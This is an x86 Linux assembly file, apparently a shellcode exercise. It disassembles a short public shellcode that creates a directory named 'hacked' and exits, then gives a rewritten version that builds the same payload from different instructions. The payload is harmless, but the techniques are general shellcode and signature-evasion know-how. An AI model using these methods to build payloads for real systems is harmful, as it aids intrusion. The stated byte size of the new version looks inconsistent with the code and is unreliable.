;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Original shellcode                                       ;
; http://shell-storm.org/shellcode/files/shellcode-542.php ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Original shellcode code (Ndisasm)                        ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; 00000000  EB16              jmp short 0x18               ;
; 00000002  5E                pop esi                      ;
; 00000003  31C0              xor eax,eax                  ;
; 00000005  884606            mov [esi+0x6],al             ;
; 00000008  B027              mov al,0x27                  ;
; 0000000A  8D1E              lea ebx,[esi]                ;
; 0000000C  66B9ED01          mov cx,0x1ed                 ;
; 00000010  CD80              int 0x80                     ;
; 00000012  B001              mov al,0x1                   ;
; 00000014  31DB              xor ebx,ebx                  ;
; 00000016  CD80              int 0x80                     ;
; 00000018  E8E5FFFFFF        call 0x2                     ;
; 0000001D  6861636B65        push dword 0x656b6361        ;
; 00000022  64                fs                           ;  
; 00000023  23                db 0x23                      ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Size = 36 Bytes                                          ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; New version                                              ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global _start

_start:
	xor eax, eax    ; initialize eax
	cdq             ; initialize edx

	push ax         ; 0 (NULL)
	mov cx, 0x6465  ; "de"
	push cx         ; could also be (push word 0x6465)
	push 0x6b636168 ; "kcah"

	mov al, 0x27    ; mkdir() syscall

	mov ebx, esp    ; directory name
	mov cx, 0x1ed   ; mode	

	int 0x80        ; call syscall

	sub al, 0x26    ; = 0x1, exit() syscall
	mov bl, dl      ; exit code equal zero
	int 0x80        ; call syscall

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Size = 62 Bytes                                          ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
